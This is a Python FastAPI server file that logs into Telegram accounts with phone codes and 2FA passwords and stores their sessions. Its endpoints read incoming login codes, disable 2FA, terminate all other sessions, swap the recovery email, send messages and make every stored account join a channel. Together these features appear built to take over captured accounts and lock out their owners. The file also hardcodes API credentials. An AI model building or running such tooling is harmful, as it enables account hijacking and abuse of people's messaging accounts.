import os, re, glob, shutil, sqlite3, asyncio
from uuid import uuid4
from pathlib import Path
from typing import Optional
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse, JSONResponse, Response
from pydantic import BaseModel
import uvicorn

from telethon import TelegramClient
from telethon.errors import (
    PhoneCodeInvalidError, PhoneCodeExpiredError,
    SessionPasswordNeededError, PasswordHashInvalidError, FloodWaitError,
)
from telethon.tl.functions.account import (
    GetPasswordRequest, GetAuthorizationsRequest,
    ResetAuthorizationRequest, SendVerifyEmailCodeRequest, VerifyEmailRequest,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.channels import JoinChannelRequest

API_ID = 32140582
API_HASH = "e9597b6e5e64a9d093071e20d0545f3f"

BASE_DIR = Path(__file__).parent
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)
STATIC_DIR = BASE_DIR / "static"
DB_PATH = str(BASE_DIR / "accounts.db")

# ── Database ──────────────────────────────────────────────────────────────────
def init_db():
    with sqlite3.connect(DB_PATH) as c:
        c.execute("""CREATE TABLE IF NOT EXISTS accounts (
            phone TEXT PRIMARY KEY,
            first_name TEXT DEFAULT '',
            last_name TEXT,
            username TEXT,
            user_id TEXT,
            has_2fa INTEGER DEFAULT 0
        )""")

def db_all():
    with sqlite3.connect(DB_PATH) as c:
        rows = c.execute(
            "SELECT phone,first_name,last_name,username,user_id,has_2fa FROM accounts"
        ).fetchall()
    return [
        {"phone": r[0], "firstName": r[1], "lastName": r[2],
         "username": r[3], "id": r[4], "has2fa": bool(r[5])}
        for r in rows
    ]

def db_save(phone, user, has_2fa=False):
    with sqlite3.connect(DB_PATH) as c:
        c.execute(
            "INSERT OR REPLACE INTO accounts VALUES (?,?,?,?,?,?)",
            (phone, user.first_name or "", user.last_name,
             user.username, str(user.id), int(has_2fa))
        )

def db_delete(phone):
    with sqlite3.connect(DB_PATH) as c:
        c.execute("DELETE FROM accounts WHERE phone=?", (phone,))

def db_set_2fa(phone, val):
    with sqlite3.connect(DB_PATH) as c:
        c.execute("UPDATE accounts SET has_2fa=? WHERE phone=?", (int(val), phone))

# ── Session helpers ───────────────────────────────────────────────────────────
def phone_safe(phone: str) -> str:
    return re.sub(r"[^a-zA-Z0-9]", "_", phone)

def session_name(phone: str) -> str:
    return str(SESSIONS_DIR / phone_safe(phone))

def make_client(sess: str) -> TelegramClient:
    return TelegramClient(sess, API_ID, API_HASH)

# ── Pending login sessions (kept alive between send-code and sign-in) ─────────
_pending: dict = {}

# ── App ───────────────────────────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app):
    init_db()
    yield
    for d in list(_pending.values()):
        try: await d["client"].disconnect()
        except: pass

app = FastAPI(lifespan=lifespan)

# ── Request models ────────────────────────────────────────────────────────────
class SendCodeBody(BaseModel):
    phone: str

class SignInBody(BaseModel):
    phone: str
    code: str
    sessionId: str
    password: Optional[str] = None

class Disable2faBody(BaseModel):
    password: str

class SendMsgBody(BaseModel):
    username: str
    message: str

class JoinBody(BaseModel):
    channel: str

class JoinAllBody(BaseModel):
    channel: str

class TermSessBody(BaseModel):
    hash: str

class EmailBody(BaseModel):
    email: str

class VerifyEmailBody(BaseModel):
    email: str
    code: str

# ── Healthcheck ───────────────────────────────────────────────────────────────
@app.get("/api/healthz")
async def healthz():
    return {"status": "ok"}

# ── Login: send code ──────────────────────────────────────────────────────────
@app.post("/api/telegram/send-code")
async def send_code(body: SendCodeBody):
    phone = body.phone.strip()
    sid = str(uuid4())
    sname = str(SESSIONS_DIR / f"pending_{sid}")
    client = make_client(sname)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
    except FloodWaitError as e:
        try: await client.disconnect()
        except: pass
        raise HTTPException(429, f"Too many requests. Wait {e.seconds}s.")
    except Exception as e:
        try: await client.disconnect()
        except: pass
        raise HTTPException(500, str(e))

    _pending[sid] = {"client": client, "phone": phone,
                     "hash": sent.phone_code_hash, "sname": sname}

    async def _cleanup():
        await asyncio.sleep(600)
        if sid in _pending:
            try: await _pending[sid]["client"].disconnect()
            except: pass
            _pending.pop(sid, None)
    asyncio.create_task(_cleanup())

    return {"sessionId": sid, "phoneCodeHash": sent.phone_code_hash}

# ── Login: verify code (+ optional 2FA password) ──────────────────────────────
@app.post("/api/telegram/sign-in")
async def sign_in(body: SignInBody):
    if body.sessionId not in _pending:
        raise HTTPException(400, "Session expired. Please go back and resend the code.")

    p = _pending[body.sessionId]
    client, phone, phash, sname = p["client"], p["phone"], p["hash"], p["sname"]

    user = None
    has_2fa = False
    try:
        user = await client.sign_in(phone, body.code, phone_code_hash=phash)
    except SessionPasswordNeededError:
        if not body.password:
            return JSONResponse(status_code=422, content={"error": "2FA_REQUIRED"})
        try:
            user = await client.sign_in(password=body.password)
            has_2fa = True
        except PasswordHashInvalidError:
            raise HTTPException(400, "Wrong 2FA password. Try again.")
        except Exception as e:
            raise HTTPException(400, str(e))
    except PhoneCodeInvalidError:
        raise HTTPException(400, "Wrong code. Please check and try again.")
    except PhoneCodeExpiredError:
        raise HTTPException(400, "Code expired. Please go back and request a new one.")
    except Exception as e:
        raise HTTPException(500, str(e))

    if not user:
        raise HTTPException(500, "Login failed unexpectedly")

    # Check 2FA status (unless we already know)
    if not has_2fa:
        try:
            pwd = await client(GetPasswordRequest())
            has_2fa = getattr(pwd, "has_password", False)
        except: pass

    # Persist session
    final = session_name(phone)
    await client.disconnect()
    _pending.pop(body.sessionId, None)
    for f in glob.glob(sname + "*"):
        ext = os.path.splitext(f)[1]
        try: shutil.move(f, final + ext)
        except: pass

    db_save(phone, user, has_2fa)
    return {
        "success": True, "phone": phone,
        "firstName": user.first_name or "",
        "lastName": user.last_name,
        "username": user.username,
    }

# ── Accounts list ─────────────────────────────────────────────────────────────
@app.get("/api/telegram/accounts")
async def list_accounts():
    return db_all()

# ── Remove account ────────────────────────────────────────────────────────────
@app.delete("/api/telegram/accounts/{phone}")
async def remove_account(phone: str):
    from urllib.parse import unquote
    phone = unquote(phone)
    for f in glob.glob(session_name(phone) + "*"):
        try: os.remove(f)
        except: pass
    db_delete(phone)
    return {"success": True}

# ── Disable 2FA ───────────────────────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/disable-2fa")
async def disable_2fa(phone: str, body: Disable2faBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client.edit_2fa(current_password=body.password, new_password=None)
        db_set_2fa(phone, False)
        return {"success": True, "message": "2FA disabled successfully"}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Get login code from Telegram messages ─────────────────────────────────────
@app.get("/api/telegram/accounts/{phone}/login-code")
async def get_login_code(phone: str):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        msgs = await client.get_messages(777000, limit=10)
        for msg in msgs:
            if msg.text:
                m = re.search(r"\b(\d{5,6})\b", msg.text)
                if m:
                    return {
                        "found": True, "code": m.group(1), "from": "Telegram",
                        "date": msg.date.isoformat() if msg.date else None,
                    }
        return {"found": False, "code": None}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── List active sessions ───────────────────────────────────────────────────────
@app.get("/api/telegram/accounts/{phone}/sessions")
async def get_sessions(phone: str):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        result = await client(GetAuthorizationsRequest())
        return [
            {
                "hash": str(a.hash),
                "deviceModel": a.device_model,
                "platform": a.platform,
                "appName": a.app_name,
                "country": a.country,
                "ip": a.ip,
                "current": a.current,
                "dateActive": a.date_active.isoformat() if a.date_active else None,
                "dateCreated": a.date_created.isoformat() if a.date_created else None,
            }
            for a in result.authorizations
        ]
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Terminate one session ─────────────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/terminate-session")
async def terminate_session(phone: str, body: TermSessBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client(ResetAuthorizationRequest(hash=int(body.hash)))
        return {"success": True}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Terminate all other sessions ──────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/terminate-all-sessions")
async def terminate_all(phone: str):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client(ResetAuthorizationsRequest())
        return {"success": True}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Send message ──────────────────────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/send-message")
async def send_message(phone: str, body: SendMsgBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client.send_message(body.username, body.message)
        return {"success": True, "message": "Message sent"}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Join channel (single account) ─────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/join-channel")
async def join_channel(phone: str, body: JoinBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        entity = await client.get_entity(body.channel)
        await client(JoinChannelRequest(entity))
        return {"success": True, "message": f"Joined {body.channel}"}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Join channel (all accounts) ───────────────────────────────────────────────
@app.post("/api/telegram/join-all")
async def join_all(body: JoinAllBody):
    results = []
    for acc in db_all():
        client = make_client(session_name(acc["phone"]))
        try:
            await client.connect()
            entity = await client.get_entity(body.channel)
            await client(JoinChannelRequest(entity))
            results.append({"phone": acc["phone"], "success": True})
        except Exception as e:
            results.append({"phone": acc["phone"], "success": False, "error": str(e)})
        finally:
            try: await client.disconnect()
            except: pass
    return {"results": results}

# ── Change email: send code ───────────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/change-email")
async def change_email(phone: str, body: EmailBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client(SendVerifyEmailCodeRequest(email=body.email))
        return {"success": True, "message": "Verification code sent to email"}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Change email: verify code ─────────────────────────────────────────────────
@app.post("/api/telegram/accounts/{phone}/verify-email")
async def verify_email(phone: str, body: VerifyEmailBody):
    from urllib.parse import unquote
    phone = unquote(phone)
    client = make_client(session_name(phone))
    try:
        await client.connect()
        await client(VerifyEmailRequest(email=body.email, code=body.code))
        return {"success": True, "message": "Email changed successfully"}
    except Exception as e:
        raise HTTPException(500, str(e))
    finally:
        try: await client.disconnect()
        except: pass

# ── Static file serving ───────────────────────────────────────────────────────
@app.get("/")
async def index():
    return FileResponse(STATIC_DIR / "index.html")

@app.get("/style.css")
async def style():
    return FileResponse(STATIC_DIR / "style.css", media_type="text/css")

@app.get("/script.js")
async def script_js():
    return FileResponse(STATIC_DIR / "script.js", media_type="application/javascript")

@app.get("/favicon.svg")
async def favicon():
    svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#00C2FF" stroke-width="2"><path d="M22 2L11 13"/><path d="M22 2L15 22l-4-9-9-4 20-7z"/></svg>'
    return Response(svg, media_type="image/svg+xml")

# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("server:app", host="0.0.0.0", port=port, reload=False)
